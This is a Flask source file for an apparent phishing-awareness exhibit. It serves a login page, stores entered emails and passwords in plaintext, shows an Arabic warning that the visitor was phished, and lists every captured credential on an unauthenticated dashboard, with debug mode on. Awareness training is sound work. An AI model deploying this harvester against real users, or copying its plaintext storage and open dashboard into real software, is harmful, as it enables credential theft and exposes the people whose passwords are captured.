from flask import Flask, request, render_template, redirect
import sqlite3
from datetime import datetime

app = Flask(__name__)

def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT,
            password TEXT,
            time TEXT,
            ip TEXT
        )
    ''')
    conn.commit()
    conn.close()

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form['email']
    password = request.form['password']
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    ip = request.remote_addr
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("INSERT INTO attempts (email, password, time, ip) VALUES (?, ?, ?, ?)",
              (email, password, time, ip))
    conn.commit()
    conn.close()
    return redirect('/awareness')

@app.route('/awareness')
def awareness():
    return '''
    <div style="text-align:center; font-family:Arial; padding:50px;">
      <h1 style="color:red;">⚠️ تحذير!</h1>
      <h2>لقد وقعت في فخ التصيد الإلكتروني!</h2>
      <p>هذه تجربة تعليمية فقط. بياناتك لن تُستخدم خارج هذا المعرض.</p>
      <a href="/dashboard">
        <button style="background:#4285F4;color:white;padding:10px 20px;
        border:none;border-radius:5px;font-size:16px;cursor:pointer;">
          شاهد الإحصائيات
        </button>
      </a>
    </div>
    '''

@app.route('/dashboard')
def dashboard():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("SELECT email, password, time, ip FROM attempts")
    data = c.fetchall()
    conn.close()
    return render_template('dashboard.html', attempts=data, total=len(data))

if __name__ == '__main__':
    init_db()
    app.run(debug=True)